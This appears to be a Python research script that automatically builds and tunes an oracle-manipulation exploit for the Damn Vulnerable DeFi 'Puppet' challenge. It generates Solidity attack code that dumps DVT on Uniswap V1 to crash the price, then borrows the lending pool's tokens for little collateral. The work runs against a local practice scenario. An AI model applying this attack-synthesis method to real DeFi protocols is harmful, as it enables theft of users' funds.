import sys
import os
import itertools
import math
import builtins
import time
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict
from Actions.Utils import *
from Actions.UtilsDVD import *  # DVD represents "Damn Vulnerable DeFi"
from Actions.UtilsPrecision import *


class puppetAction():
    initialStates = [10, 10, 100000] 
    globalStates = [10, 10, 100000] # Uniswap DVT reserve, ETH reserve, PuppetPool reserve


    initialBalances = {"DVT": 1000, "ETH": 25}
    currentBalances = {"DVT": 1000, "ETH": 25}
    TargetTokens = {'ETH', 'DVT'}
    TokenPrices = {"ETH": 1000.0, "DVT": 1.0}


    start_str = '''// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
import {PuppetPool} from "../../../Contracts/puppet/PuppetPool.sol";
import {Strings} from "openzeppelin-contracts/utils/Strings.sol";
import "ds-test/test.sol";


interface UniswapV1Exchange {
    function addLiquidity(
        uint256 min_liquidity,
        uint256 max_tokens,
        uint256 deadline
    ) external payable returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold)
        external
        view
        returns (uint256);
    
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline)  external payable returns (uint256);

}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract PuppetV1 is DSTest, stdCheats {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 25e18;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    UniswapV1Exchange internal uniswapV1ExchangeTemplate;
    UniswapV1Exchange internal uniswapExchange;
    UniswapV1Factory internal uniswapV1Factory;

    DamnValuableToken internal dvt;
    PuppetPool internal puppetPool;
    address payable internal attacker;

    uint256 DVTasked;
    uint256 ETHneed;

    uint DVTspent;
    uint ETHgot;

    string str89;
    string str90;
    string str91;


    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        uniswapV1Factory = UniswapV1Factory(
            deployCode("./src/build-uniswap/v1/UniswapV1Factory.json")
        );

        // Deploy a exchange that will be used as the factory template
        uniswapV1ExchangeTemplate = UniswapV1Exchange(
            deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json")
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        uniswapExchange = UniswapV1Exchange(
            uniswapV1Factory.createExchange(address(dvt))
        );

        vm.label(address(uniswapExchange), "Uniswap Exchange");

        // Deploy the lending pool
        puppetPool = new PuppetPool(address(dvt), address(uniswapExchange));
        vm.label(address(puppetPool), "Puppet Pool");

        // Add initial token and ETH liquidity to the pool
        dvt.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE, // max_tokens
            DEADLINE // deadline
        );

        // Ensure Uniswap exchange is working as expected
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(
                1 ether,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );
        vm.startPrank(attacker);
        dvt.approve(address(uniswapExchange), 2 ** 256 - 1);
        
        // console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }
    

    function UniswapSummary() public view returns  (string memory _uintAsString){
        uint balance1 = dvt.balanceOf(address(uniswapExchange)) / 10 ** 18;
        uint balance2 = address(uniswapExchange).balance / 10 ** 18;
        return appendWithSpace(appendWithSpace("DVT: ", uint2str(balance1)), appendWithSpace("ETH: ", uint2str(balance2)));
    }

    function puppetPoolSummary() public view returns  (string memory _uintAsString){
        uint balance = dvt.balanceOf(address(puppetPool)) / 10 ** 18;
        return appendWithSpace("DVT reserve: ", uint2str(balance));
    }

    function ProfitSummary() public view returns  (string memory _uintAsString){
        uint balance = dvt.balanceOf(attacker) / 10 ** 18;
        uint balance2 = address(attacker).balance / 10 ** 18;
        return appendWithSpace(appendWithSpace("DVT: ", uint2str(balance)), appendWithSpace("ETH: ", uint2str(balance2)));

        // original balances:
        // Uniswap V1: 10 DVT  10 ETH
        // attacker: 1000 DVT  25 ETH
        // puppetPool: 100_000 DVT
        // 1 ether = 1000 DVT
        // Try to get as many DVT as possible while keeping ETH as much as possible 
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(
        uint256 input_amount,
        uint256 input_reserve,
        uint256 output_reserve
    ) internal returns (uint256) {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        return Strings.toString(_i);
    }
                
                
    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }
                
    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }


    '''


    attack_str = ""
    collector_str = ""


    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()


    def calcProfit(stats):
        # print(stats)
        if stats == None or len(stats) != 2:
            return 0
        DVT_earned = stats[0] - puppetAction.initialBalances['DVT']
        ETH_earned = stats[1] - puppetAction.initialBalances['ETH']
        
        return DVT_earned + ETH_earned * 1000.0


    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit

    @classmethod
    def buildAttackContract(cls, ActionList):
        cls.attack_str = buildDVDattackContract(ActionList) + "       revert(ProfitSummary());\n"
        return cls.attack_str

    @classmethod
    def buildCollectorContract(cls, ActionList):
        cls.collector_str = buildDVDCollectorContract(ActionList)
        return cls.collector_str

    def ToString(ActionList):
        return ToString(ActionList)

    
    def initialPass():
        action1 = SwapUniswapDVT2ETH
        action2 = PoolBorrow
        action3 = SwapUniswapETH2DVT

        action_list_1 = [action1, action2, action3]

        action1_prestate_dependency = [action2, action3]
        action2_prestate_dependency = [action1, action3]
        action3_prestate_dependency = [action1, action2]
        
        # seq of actions
        ActionWrapper = puppetAction
        action_lists = [action3_prestate_dependency + [action3], \
                        action1_prestate_dependency + [action1], \
                        action2_prestate_dependency + [action2]]
        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))


    def runinitialPass():
        return
        

class SwapUniswapETH2DVT(puppetAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ['ETH']
    tokensOut = ['DVT']
    range = [0, 50]

    @classmethod
    def actionStr(cls):
        action = "      // Action: SwapUniswapETH2DVT\n"
        action += '''       uniswapExchange.ethToTokenSwapInput{value: $$e18}(1, 0xffffffff);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: SwapUniswapETH2DVT\n"
        action += '''       uint DVTgot = dvt.balanceOf(address(attacker));\n'''
        action += '''       str89 = UniswapSummary();\n'''
        action += '''       uniswapExchange.ethToTokenSwapInput{value: $$e18}(1, 0xffffffff);\n'''
        action += '''       str90 = UniswapSummary();\n'''
        action += '''       DVTgot = dvt.balanceOf(address(attacker)) - DVTgot;\n'''
        action += '''       revert( appendWithSpace( str89, appendWithSpace( str90, uint2str(DVTgot / 10 ** 18) ) ) );\n'''
        return action


    @classmethod
    def aliquotValues(cls, values):
        return values[2], values[3], values[4]
    
    @classmethod
    def add1PointValue(cls, inputs, values):
        if values == None or len(values) != 5:
            return
        
        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) # DVT reserve, ETH reserve

        v0, v1, v2 = cls.aliquotValues(values)
        cls.values[0].append(v0) # DVT reserve
        cls.values[1].append(v1) # ETH reserve
        cls.values[2].append(v2) # DVT got

        cls.hasNewDataPoints = True
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False
    
    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], input]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2

    @classmethod
    def transit(cls, input):
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances["ETH"] -= input

        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.currentBalances["DVT"] += output2
        return 

    @classmethod
    def string(cls):
        return cls.__name__


class SwapUniswapDVT2ETH(puppetAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ['DVT']
    tokensOut = ['ETH']
    range = [0, 1000]

    @classmethod
    def actionStr(cls):
        action = "      // Action: SwapUniswapDVT2ETH\n"
        action += '''       uniswapExchange.tokenToEthSwapInput($$e18, 1, 0xffffffff);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: SwapUniswapDVT2ETH\n"
        action += '''       ETHgot = attacker.balance;\n'''
        action += '''       str89 = UniswapSummary();\n'''
        action += '''       uniswapExchange.tokenToEthSwapInput($$e18, 1, 0xffffffff);\n'''
        action += '''       str90 = UniswapSummary();\n'''
        action += '''       ETHgot = attacker.balance - ETHgot;\n'''
        action += '''       revert( appendWithSpace( str89, appendWithSpace( str90, uint2str(ETHgot / 10 ** 18) ) ) );\n'''
        return action


    @classmethod
    def aliquotValues(cls, values):
        return values[2], values[3], values[4]
    
    @classmethod
    def add1PointValue(cls, inputs, values):
        if values == None or len(values) != 5:
            return
        
        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) # DVT reserve, ETH reserve

        v0, v1, v2 = cls.aliquotValues(values)
        cls.values[0].append(v0) # DVT reserve
        cls.values[1].append(v1) # ETH reserve
        cls.values[2].append(v2) # ETH got

        cls.hasNewDataPoints = True
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False
    
    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], input]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2

    @classmethod
    def transit(cls, input):
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances["DVT"] -= input

        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.currentBalances["ETH"] += output2
        return 

    @classmethod
    def string(cls):
        return cls.__name__


class PoolBorrow(puppetAction):
    points = []
    values = [[], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None


    numInputs = 1
    tokensIn = ['ETH']
    tokensOut = ['DVT']
    range = [0, 100000]
    
    @classmethod
    def actionStr(cls):
        action = "      // Action: PoolBorrow\n"
        action += '''       DVTasked = $$e18;\n'''
        action += '''       ETHneed = puppetPool.calculateDepositRequired( DVTasked );\n'''
        action += '''       puppetPool.borrow{value: ETHneed}( DVTasked );\n'''

        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: PoolBorrow\n"
        action += '''       str89 = UniswapSummary();\n'''
        action += '''       str90 = puppetPoolSummary();\n'''
        action += '''       DVTasked = $$e18;\n'''
        action += '''       ETHneed = puppetPool.calculateDepositRequired( DVTasked );\n'''
        action += '''       puppetPool.borrow{value: ETHneed}( DVTasked );\n'''
        action += '''       str91 = puppetPoolSummary();\n'''
        action += '''       str90 = appendWithSpace( str90, str91 );\n'''
        action += '''       revert( appendWithSpace( str89, appendWithSpace( str90, uint2str(ETHneed / 10 ** 18) ) ) );\n'''
        return action       


    @classmethod
    def aliquotValues(cls, values):
        return values[3], values[4]

    @classmethod
    def add1PointValue(cls, inputs, values):
        if values == None or len(values) != 5:
            return
        
        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) # DVT reserve, ETH reserve
        
        v0, v1 = cls.aliquotValues(values)
        cls.values[0].append(v0) # Pool reserve after action
        cls.values[1].append(v1) # ETH needed

        cls.hasNewDataPoints = True
        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [2,3])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0,1,3])    
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs1 = [cls.globalStates[2], input]
        inputs2 = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs1)
        output1 = cls.approximator1(inputs2)

        return output0, output1
        

    @classmethod
    def transit(cls, input):
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        

        cls.currentBalances["DVT"] += input
        

        output0, output1 = cls.simulate(input)
        
        cls.globalStates[2] = output0
        cls.currentBalances["ETH"] -= output1
        return

    @classmethod
    def string(cls):
        return cls.__name__



def main():

    # config.method
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 0
    config.ETHorBSCorDVDorFantom = 2  # 0 for ETH, 1 for BSC, 2 for DVD
    
    puppetAction.initialPass()

    # puppetAction.runinitialPass()

    # action1 = SwapUniswapDVT2ETH
    # action2 = PoolBorrow

    # ActionWrapper = puppetAction

    # action_list = [action1, action2]
    # initial_guess = [1000, 100000]
    
    # # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    # actual_profit = 89000.0
    # print("actual profit: ", actual_profit)
    # e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
    # return actual_profit, e1, e2, e3, e4



if __name__ == "__main__":
    main()
    